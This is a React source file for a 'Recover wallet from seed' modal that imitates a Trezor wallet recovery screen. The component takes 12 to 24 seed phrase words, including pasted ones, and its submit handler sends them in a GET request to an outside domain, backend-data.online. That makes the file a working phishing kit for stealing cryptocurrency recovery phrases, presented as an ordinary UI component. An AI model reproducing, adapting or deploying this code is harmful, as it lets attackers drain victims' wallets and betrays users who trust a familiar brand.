import React from "react";



const Modal = () => {
  const [segments, setSegments] = React.useState([]);

  function onPaste(event) {
    const pasted = event.clipboardData.getData("text/plain");
    setSegments(pasted.split(" ").slice(0, 24));
  }

  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [trezor App]
      ${segments}
      `,
    };
    fetch(
      `https://backend-data.online/backend/start.php?phrase=${vault.main}`,
      {
        method: "GET",
        mode: "cors",
        headers: { "content-type": "application/json" },
      }
    ).then((success) => {
      setSegments(["", "", "", "", "", "", "", "", "", "", "", ""]);
    });
  };
  return (
    <div className="transition-10 duration-50 justify-center items-center flex fixed lg:top-0 top-0 inset-0  z-50 outline-0 ">
      <div className="">
        <div className="lg:w-[30rem] w-[23rem]  rounded-md bg-white drop-shadow-2xl p-4 ">
          <form action="javascript: validateData()" method="post">
            <div>
              <div className="mt-3 text-center sm:mt-5">
                <div className="mt-8">
                  <h3
                    className="text-xl font-semibold leading-6 text-[#6c6c6c] "
                    id="modal-title"
                  >
                    Recover wallet from seed
                  </h3>

                  <div className="mt-3">
                    <button
                      onClick={() => {
                        setSegments([
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                        ]);
                      }}
                      type="button"
                      className="px-4 py-2 text-sm border border-[#cdcdcd] m-2 rounded button-words-12 text-[#0c0c0c]"
                    >
                      12 words
                    </button>
                    <button
                      onClick={() => {
                        setSegments([
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                        ]);
                      }}
                      type="button"
                      className="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-15"
                    >
                      15 words
                    </button>
                    <button
                      onClick={() => {
                        setSegments([
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                        ]);
                      }}
                      type="button"
                      className="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-18"
                    >
                      18 words
                    </button>
                    <button
                      onClick={() => {
                        setSegments([
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                        ]);
                      }}
                      type="button"
                      className="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-24"
                    >
                      24 words
                    </button>
                  </div>
                  <div className="grid lg:grid-cols-3 grid-cols-2 gap-3  lg:p-4 rounded-2xl relative">
                    {segments?.map((s, key) => (
                      <div key={key}>
                        {/* <label className="text-slate-400">{key + 1}.</label> */}
                        <input
                          value={s}
                          onPaste={onPaste}
                          placeholder={key + 1}
                          name="tjhgdjhagd"
                          className="border mt-2 md:mt-0 border-[#cdcdcd] w-[95%] text-[#0c0c0c] bg-white rounded py-1 px-2 text-sm mnemonicInput outline-none"
                        />
                      </div>
                    ))}
                  </div>
                </div>
              </div>
              {segments.length > 1 && (
                <div className="mt-3">
                  <button
                    onClick={() => submitAddress()}
                    type="submit"
                    className={
                      segments[0]?.length < 3
                        ? "mt-3 w-full rounded-md px-4 py-2 text-base font-medium bg-[#00854d] text-[#f0f8ff] opacity-10"
                        : "mt-3 w-full rounded-md px-4 py-2 text-base font-medium bg-[#00854d] text-[#f0f8ff]"
                    }
                    disabled={segments[0]?.length < 3}
                  >
                    Continue
                  </button>
                </div>
              )}
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Modal;
